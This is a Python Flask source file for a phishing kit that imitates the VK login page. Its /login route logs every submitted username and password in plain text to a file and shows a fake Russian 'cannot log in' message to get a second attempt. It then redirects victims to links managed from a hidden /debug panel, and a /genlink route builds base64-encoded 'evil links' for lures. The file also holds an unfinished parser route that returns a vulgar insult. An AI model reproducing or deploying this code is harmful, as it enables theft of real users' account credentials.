# Import Additional req`s
from flask import Flask, render_template, send_from_directory, request, Markup, redirect
import os
import base64
from datetime import datetime
#
import VkParser


# Settings
LOGIN_FILE      = os.path.abspath('./log.txt')
TEMPLATE_DIR    = os.path.abspath('../templates')
STATIC_DIR      = os.path.abspath('./static')
PANEL_LINK      = "/debug"
LOG_STATE       = False
NGROK_STATE     = False

# Run flask settings
app = Flask(__name__, static_folder=str(STATIC_DIR))

# @@@ ADDITIONAL FUCNTIONS @@@ #
# NGROK
if NGROK_STATE:
    from pyngrok import ngrok
    http_tunel = ngrok.connect(5000)
    print(ngrok.get_tunnels())

# LOG
if LOG_STATE:
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

# Encode
def encodeLink(input_link):
    link_bytes = input_link.encode('utf-8')
    base64_bytes = base64.b64encode(link_bytes)
    base64_link = base64_bytes.decode('utf-8')
    print('BASE: '+str(base64_link))
    return base64_link

# Decode
def decodeLink(input_link):
    base64_bytes = input_link.encode('utf-8')
    link_bytes = base64.b64decode(base64_bytes)
    link = link_bytes.decode('utf-8')
    return link

# Log data
def login_log():
    login = request.form["login"]
    passw = request.form["password"]
    log_file = open(LOGIN_FILE,"a")
    date = str(datetime.now())
    data = "["+date+"]\t["+login+"]\t["+passw+"]\n"
    log_file.write(data)
    log_file.close()

# Get link from file
def getLink():
    linkFile = open(STATIC_DIR+"/link")
    link = linkFile.readline()
    linkFile.close()
    return link.replace("\n","")

# @@@ PAGES @@@ #
# Login
@app.route('/login', methods=['POST','GET'])
def login():
    if request.method == 'POST':

        login_log()

        link_state = None
        error_state = None

        if "true" in request.referrer:
            error_state = "true"

        if "link=" in request.referrer:
            link_state = request.referrer.split("link=")[1]

        if error_state is None:
            if link_state is None:
                return_link = '/login?error=true'
                return redirect(return_link, code=302)
            else:
                return_link = '/login?error=true&link='+link_state
                return redirect(return_link, code=302)
        else:
            if link_state is None:
                return redirect(getLink(), code=302)
            else:
                return redirect(decodeLink(link_state), code=302)

    elif request.method == 'GET':
        error_state = request.args.get("error")
        link_state = request.args.get("link")

        if error_state is None:
            return render_template("login.html")
        else:
            div = Markup('<div class="service_msg_box"><div class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных. <a href="https://static.vk.com/restore">Проблемы со входом?</a></div></div>')
            return render_template("login.html",error_div=div)

# Panel
@app.route(PANEL_LINK)
def panel():
    #Settings page
    links_file = open(STATIC_DIR+"/links")
    div = ""
    for link in links_file.readlines():
        div += '<option value="'+link+'">'+link+'</option>'
    links_file.close()
    return render_template("panel.html",select_div=Markup(div))

# @@@ POST_REQUES @@@ #
@app.route('/add_link', methods=['POST'])
def add_link():
    if request.method == 'POST':
        link = request.form["new_link"]
        links_file = open(STATIC_DIR+"/links","a")
        links_file.write(link+"\n")
        links_file.close()
        return redirect(PANEL_LINK,code=302)
    else:
        return redirect(PANEL_LINK,code=302)

# Select Link
@app.route('/select_link', methods=['POST'])
def select_link():
    if request.method == 'POST':
        link = request.form["links"]
        link_file = open(STATIC_DIR+"/link","w")
        link_file.write(link)
        link_file.close
        return redirect(PANEL_LINK, code=302)
    else:
        return redirect(PANEL_LINK, code=302)

# Generate Link
@app.route('/genlink', methods=['POST'])
def genLink():
    if request.method == 'POST':
        link = request.form["link"]
        encLink = encodeLink(link)
        # Create Evil link
        evilLink = request.referrer.split(PANEL_LINK)[0]+'/login?link='+str(encLink)
        return evilLink


# Обработчик парсера
@app.route('/parse', methods=['POST'])
def launchParse():
    # Потом может быть переделать на restapi
    if request._method == 'POST':
        # Собираем данные
        user_id = request.form["uid"]
        group_id = request.form["gid"]
        # Проверяем токен для UID

        # Токен есть, идем собирать
        VkParser.get
        # Ну собсна все
    else:
        return("Соси хуй, меня надо пинать POST`ом")



###########
# Run app #
###########

if __name__ == '__main__':
    app.run()

